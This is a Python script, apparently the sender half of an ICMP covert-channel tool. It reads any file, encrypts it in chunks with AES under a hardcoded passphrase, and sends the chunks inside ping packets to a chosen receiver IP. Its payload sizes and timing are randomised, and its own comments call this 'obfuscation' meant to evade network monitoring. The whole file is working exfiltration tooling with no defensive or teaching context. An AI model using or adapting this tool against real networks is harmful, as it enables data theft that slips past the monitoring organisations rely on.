import os
import sys
import time
import random
import struct
import socket
import select
from scapy.all import IP, ICMP, Raw, send
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import hashlib

PASSPHRASE = "mypassword"
CHUNK_SIZE = 56
TIMEOUT = 2.0
MAX_RETRIES = 5
ICMP_ID = 0x1337

# PAYLOAD-SIZE VARIABILITY 
MIN_PAYLOAD = 64
MAX_PAYLOAD = 128

# TIMING OBFUSCATION 
MIN_DELAY = 0.2
MAX_DELAY = 1.2

max_ct_len = MAX_PAYLOAD - 2 - 16
if max_ct_len <= 0:
    raise SystemExit(f"MAX_PAYLOAD too small (<=18). Increase MAX_PAYLOAD.")
max_padded_plaintext = (max_ct_len // 16) * 16
if CHUNK_SIZE > max_padded_plaintext:
    raise SystemExit(f"CHUNK_SIZE {CHUNK_SIZE} too large for MAX_PAYLOAD {MAX_PAYLOAD}. "
                     f"Max plaintext allowed: {max_padded_plaintext} bytes.")

def derive_key(passphrase: str, salt: bytes, iterations: int = 100000) -> bytes:
    return PBKDF2(passphrase, salt, dkLen=32, count=iterations)

def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def build_data_payload(iv: bytes, ciphertext: bytes, min_payload=MIN_PAYLOAD, max_payload=MAX_PAYLOAD) -> bytes:
    header = struct.pack("!H", len(ciphertext))
    base = header + iv + ciphertext
    target_size = random.randint(min_payload, max_payload)
    if len(base) > target_size:
        target_size = len(base)
    filler_len = target_size - len(base)
    if filler_len > 0:
        filler = get_random_bytes(filler_len)
        return base + filler
    else:
        return base

def send_packet_with_ack(seq_num: int, payload: bytes, dst,
                         timeout=TIMEOUT, max_retries=MAX_RETRIES) -> bool:
    pkt = IP(dst=dst)/ICMP(type=8, id=ICMP_ID, seq=seq_num)/Raw(load=payload)

    retries = 0
    while retries < max_retries:
        try:
            rsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            rsock.setblocking(0)
        except PermissionError:
            print("[!] Need root privileges to open raw socket. Run as root.")
            return False

        send(pkt, verbose=0)

        got_ack = False
        start = time.time()
        while time.time() - start < timeout:
            remaining = timeout - (time.time() - start)
            if remaining <= 0:
                break
            r, _, _ = select.select([rsock], [], [], remaining)
            if not r:
                break
            try:
                packet, addr = rsock.recvfrom(65535)
            except OSError:
                break
            if len(packet) < 28:
                continue
            ip_header_len = (packet[0] & 0x0F) * 4
            icmp_offset = ip_header_len
            if icmp_offset + 8 > len(packet):
                continue
            icmp_type = packet[icmp_offset]
            if icmp_type != 0:
                continue
            recv_id = (packet[icmp_offset + 4] << 8) | packet[icmp_offset + 5]
            recv_seq = (packet[icmp_offset + 6] << 8) | packet[icmp_offset + 7]
            src_ip = addr[0]
            if recv_id == ICMP_ID and recv_seq == seq_num and src_ip == dst:
                got_ack = True
                break

        rsock.close()

        if got_ack:
            return True

        retries += 1
        print(f"[!] Timeout waiting for ACK for seq {seq_num} (retry {retries}/{max_retries})")
        time.sleep(0.05)

    return False

def prompt_inputs():
    while True:
        dst = input("Receiver IP (required): ").strip()
        if dst:
            break
        print("Receiver IP is required. Please enter a value.")
    while True:
        file_path = input("File to send (required): ").strip()
        if file_path:
            break
        print("File path is required. Please enter a value.")
    return dst, file_path

def main():
    DEST_IP, FILE_PATH = prompt_inputs()

    if not os.path.exists(FILE_PATH):
        print(f"File not found: {FILE_PATH}")
        sys.exit(1)

    with open(FILE_PATH, "rb") as f:
        plaintext = f.read()
    file_hash = hashlib.sha256(plaintext).digest()

    salt = get_random_bytes(16)
    key = derive_key(PASSPHRASE, salt)

    start_payload = b"START" + salt
    print("[*] Sending START marker (seq=0) with salt")
    if not send_packet_with_ack(0, start_payload, dst=DEST_IP):
        print("[!] Failed to get ACK for START. Aborting.")
        sys.exit(2)

    chunks = [plaintext[i:i+CHUNK_SIZE] for i in range(0, len(plaintext), CHUNK_SIZE)]
    seq = 1
    for chunk in chunks:
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded = pkcs7_pad(chunk, 16)
        ct = cipher.encrypt(padded)
        payload = build_data_payload(iv, ct, MIN_PAYLOAD, MAX_PAYLOAD)
        print(f"[*] Sending chunk seq {seq} (plaintext {len(chunk)} B -> ct {len(ct)} B, payload {len(payload)} B)")
        ok = send_packet_with_ack(seq, payload, dst=DEST_IP)
        if not ok:
            print(f"[!] Failed to transmit chunk seq {seq} after {MAX_RETRIES} retries. Aborting.")
            sys.exit(3)
        seq += 1
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        time.sleep(delay)

    print("[*] Sending HASH marker (seq=65534) with SHA256")
    hash_payload = b"HASH" + file_hash
    if not send_packet_with_ack(65534, hash_payload, dst=DEST_IP):
        print("[!] Failed to get ACK for HASH. Aborting.")
        sys.exit(4)

    print("[*] Sending END marker (seq=65535)")
    if not send_packet_with_ack(65535, b"END", dst=DEST_IP):
        print("[!] Failed to get ACK for END. Aborting.")
        sys.exit(5)

    print("[+] Transmission complete.")

if __name__ == "__main__":
    main()
